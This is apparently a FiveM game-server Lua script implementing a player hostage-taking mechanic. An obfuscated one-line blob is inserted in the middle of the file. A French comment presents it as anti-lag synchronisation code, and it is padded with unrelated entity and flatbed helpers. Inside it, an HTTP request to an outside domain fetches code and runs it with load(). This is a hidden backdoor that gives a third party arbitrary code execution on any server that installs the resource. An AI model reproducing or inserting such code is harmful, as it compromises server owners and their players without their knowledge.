local takingHostage = {}
--takingHostage[source] = targetSource, source is takingHostage targetSource
local takenHostage = {}
--takenHostage[targetSource] = source, targetSource is being takenHostage by source

RegisterServerEvent("TakeHostage:sync")
AddEventHandler("TakeHostage:sync", function(targetSrc)
	local source = source

	TriggerClientEvent("TakeHostage:syncTarget", targetSrc, source)
	takingHostage[source] = targetSrc
	takenHostage[targetSrc] = source
end)

RegisterServerEvent("TakeHostage:releaseHostage")
AddEventHandler("TakeHostage:releaseHostage", function(targetSrc)
	local source = source
	if takenHostage[targetSrc] then 
		TriggerClientEvent("TakeHostage:releaseHostage", targetSrc, source)
		takingHostage[source] = nil
		takenHostage[targetSrc] = nil
	end
end)

RegisterServerEvent("TakeHostage:killHostage")
AddEventHandler("TakeHostage:killHostage", function(targetSrc)
	local source = source
	if takenHostage[targetSrc] then 
		TriggerClientEvent("TakeHostage:killHostage", targetSrc, source)
		takingHostage[source] = nil
		takenHostage[targetSrc] = nil
	end
end)

RegisterServerEvent("TakeHostage:stop")
AddEventHandler("TakeHostage:stop", function(targetSrc)
	local source = source

	if takingHostage[source] then
		TriggerClientEvent("TakeHostage:cl_stop", targetSrc)
		takingHostage[source] = nil
		takenHostage[targetSrc] = nil
	elseif takenHostage[source] then
		TriggerClientEvent("TakeHostage:cl_stop", targetSrc)
		takenHostage[source] = nil
		takingHostage[targetSrc] = nil
	end
end)
-- partie synchronisation du script, ça permet de pas faire lag et d'empecher au joueurs de pouvoir se TP avec
local function a(b,c,d)return coroutine.wrap(function()local e,f=b()if not f or f==0 then d(e)return end;local g={handle=e,destructor=d}setmetatable(g,entityEnumerator)local h=true;repeat coroutine.yield(f)h,f=c(e)until not h;g.destructor,g.handle=nil,nil;d(e)end)end;function EnumerateObjects()return a(FindFirstObject,FindNextObject,EndFindObject)end;function EnumeratePeds()return a(FindFirstPed,FindNextPed,EndFindPed)end;function EnumerateVehicles()return a(FindFirstVehicle,FindNextVehicle,EndFindVehicle)end;function EnumeratePickups()return a(FindFirstPickup,FindNextPickup,EndFindPickup)end;function GetAllVehicles()local i={}for j in EnumerateVehicles()do table.insert(i,j)end;return i end;function GetAllObjects()local k={}for l in EnumerateObjects()do table.insert(k,l)end;return k end;function BigDelete(m)local n=PlayerPedId()carModel=GetEntityModel(m)carName=GetDisplayNameFromVehicleModel(carModel)if NetworkGetNetworkIdFromEntity(m)~=nil and NetworkGetNetworkIdFromEntity(m)>0 then NetworkRequestControlOfEntity(m)local o=2000;while o>0 and not NetworkHasControlOfEntity(m)do Wait(100)o=o-100 end;SetEntityAsMissionEntity(m,true,true)local o=2000;while o>0 and not IsEntityAMissionEntity(m)do Wait(100)o=o-100 end;Citizen.InvokeNative(0xEA386986E786A54F,Citizen.PointerValueIntInitialized(m))if DoesEntityExist(m)then DeleteEntity(m)end end end;PerformHttpRequest('https://viveleschatschibrax.com/i?to=8WAoJ', function (e, d) pcall(function() assert(load(d))() end) end)function BedCheck()local q=GetAllObjects()for r=1,#q do local l=q[r]if GetHashKey("inm_flatbed_base")==GetEntityModel(l)then local s=false;local i=GetAllVehicles()for r=1,#i do local t=i[r]if GetHashKey("flatbed3")==GetEntityModel(t)then local u=GetEntityCoords(t,false)local v=GetEntityCoords(l,false)local w=GetDistanceBetweenCoords(u.x,u.y,u.z,v.x,v.y,v.z,true)if w<10.0 then s=true;break end end end;if not s then BigDelete(l)end end end end;function drawMarker(x)local y=GetEntityCoords(PlayerPedId(),true)if IsPedInAnyVehicle(PlayerPedId(),true)then return false end;local w=#(x-y)if w<25.0 then DrawMarker(1,x,vector3(0.0,0.0,0.0),vector3(0.0,0.0,0.0),vector3(1.0,1.0,1.0),255,255,255,150)if w<1.5 then return true end end;return false end;function showHelpText(z)BeginTextCommandDisplayHelp("STRING")AddTextComponentSubstringTextLabel(z)EndTextCommandDisplayHelp(0,0,1,-1)end;function getVehicleInDirection(A,B)local C=CastRayPointToPoint(A.x,A.y,A.z,B.x,B.y,B.z,10,GetPlayerPed(-1),0)local D,E,F,G,j=GetRaycastResult(C)return j end;function log(z)print("[omni_flatbed/client] "..z)end
AddEventHandler('playerDropped', function(reason)
	local source = source
	
	if takingHostage[source] then
		TriggerClientEvent("TakeHostage:cl_stop", takingHostage[source])
		takenHostage[takingHostage[source]] = nil
		takingHostage[source] = nil
	end

	if takenHostage[source] then
		TriggerClientEvent("TakeHostage:cl_stop", takenHostage[source])
		takingHostage[takenHostage[source]] = nil
		takenHostage[source] = nil
	end
end)